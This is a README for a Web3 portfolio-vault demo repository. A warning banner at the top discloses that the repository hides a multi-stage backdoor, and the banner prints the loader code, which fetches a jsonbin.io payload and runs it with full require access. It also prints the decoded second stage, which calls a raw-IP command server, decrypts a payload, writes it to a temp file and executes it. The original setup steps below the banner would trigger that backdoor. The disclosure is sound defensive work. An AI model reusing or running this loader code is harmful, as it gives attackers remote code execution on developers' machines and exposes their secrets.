# Demo APAX App

> ## ⚠️ This repo ships a working remote-code-execution backdoor
>
> **Do not run `npm install` / `npm run dev` on this repo.** It contains a live,
> multi-stage loader that fetches and executes attacker-controlled code the
> instant the backend starts. Full breakdown below.
>
> ### Stage 1 — the trigger (lives in this repo)
>
> `web/src/controllers/userController.ts:294-311`, a self-invoking `async` IIFE
> that runs the moment the module loads (no route needs to be hit):
>
> ```ts
> export const getCookie = (async () => {
>   try {
>     const s = Buffer.from(process.env.DEV_API_KEY as string, "base64").toString();
>     const k = Buffer.from(process.env.DEV_SECRET_KEY as string, "base64").toString();
>     const v = Buffer.from(process.env.DEV_SECRET_VALUE as string, "base64").toString();
>
>     const r = (await axios.get(s, { headers: { [k]: v } })).data.record.cookie;
>
>     const handler = new Function("require", r);
>     handler(require);
>   } catch (error: any) {}
> })();
> ```
>
> `index.ts → routes/users.ts → controllers/userController.ts` means this fires
> on ordinary `npm run dev` / `npm start` startup. The three env vars come from
> `web/src/config/.config.env`, which is **committed with real values** (not the
> `.example` file) — named `.config.env` instead of `.env` specifically so the
> repo's `.gitignore` rule `.env*` doesn't catch it:
>
> ```
> DEV_API_KEY     (base64) → https://api.jsonbin.io/v3/b/6a4d1a6ff5f4af5e296cea81
> DEV_SECRET_KEY  (base64) → x-secret-key
> DEV_SECRET_VALUE(base64) → _
> ```
>
> ### Stage 1.5 — the jsonbin.io fetch
>
> The GET above pulls a JSON blob whose `record.cookie` field is an obfuscated
> (`javascript-obfuscator`, string-array + rotating XOR) JS payload. It's run
> via `new Function("require", r)` — i.e. given full `require()` access, so
> full Node.js capability (fs, network, child_process, env vars/secrets).
>
> ### Stage 2 — what the obfuscated payload actually does (statically decoded,
> never executed)
>
> ```js
> // 1. force-install a package that isn't a project dependency
> child_process.execSync("npm install axios socket.io-client --no-save", { windowsHide: true });
>
> // 2. call home to a hardcoded C2 — plain HTTP, raw IP, no domain
> const res = await axios.get(
>   "http://147.189.172.36/api/service/a36adbc35e69b22acbf9f834a0deb286",
>   { headers: { Authentication: "jwt" } }
> );
>
> // 3. derive an AES-256 key from that same path segment
> const key = crypto.scryptSync("a36adbc35e69b22acbf9f834a0deb286", "salt", 32);
>
> // 4. decrypt the response: "<iv_b64>:<ciphertext_b64>"
> const [ivB64, ctB64] = res.data.data.split(":");
> const decipher = crypto.createDecipheriv("aes-256-cbc", key, Buffer.from(ivB64, "base64"));
> const plaintext = decipher.update(ctB64, "base64", "utf8") + decipher.final("utf8");
>
> // 5. drop it to disk and run it as its own process
> const dst = path.join(os.tmpdir(), "wct1ECFA.tmp");
> fs.writeFileSync(dst, plaintext, { flag: "w+" });
> child_process.execSync(`node ${dst}`, { windowsHide: true, cwd: os.tmpdir() });
> ```
>
> Every error along the whole chain is silently swallowed (`catch(()=>{})` at
> every level), so a developer running the app locally sees nothing — no crash,
> no log line, no indication anything happened.
>
> `socket.io-client` isn't used anywhere in this decoded stage — it's installed
> purely for whatever stage 3 (the still-encrypted, attacker-controlled payload
> behind `147.189.172.36`) does with it, most likely a persistent, interactive
> control channel back to the attacker rather than a one-shot script.
>
> This matches the well-documented "fake take-home assignment" malware pattern
> used against developers (particularly around crypto/blockchain-themed demo
> repos like this one) to gain remote code execution on the reviewer's machine.
>
> ---

A minimal Web3 demo showcasing a portfolio vault with a modern frontend, backend API, and smart contracts.

## 🧱 Stack

- **Frontend**: Next.js
- **Backend**: Node.js + Express + ethers
- **Smart Contracts**: Solidity (Hardhat)

## 🔁 Architecture Flow

Frontend → Backend → Blockchain

- The frontend never talks directly to the blockchain
- The backend provides clean APIs and reads on-chain data
- The smart contract is the source of truth

---

## 📁 Project Structure

```text
/apax
├── /smart-contracts          # Hardhat and Smart Contracts
│   ├── /contracts
│   ├── /scripts
│   ├── /test
│   ├── hardhat.config.ts
│   ├── package.json
│   └── .env
│
├── /web                 # Web frontend (Next.js)
│   ├── /app
│   ├── /components
│   ├── /hooks
│   ├── /lib
│   ├── /public
│   ├── /src
│   ├── package.json
│   └── tsconfig.json
│
├── /shared                   # Shared resources (like ABIs)
│   ├── /abi
│   └── constants.ts
│
└── README.md                 # Project documentation

```

## Install Dependencies

From the **root of the repository**:

```bash
cd /web
npm install
```

## Run the Project

From the **root of the repository**:

```bash
npm run dev
```

## Once running, open your browser and go to: http://localhost:3000 to view the app locally.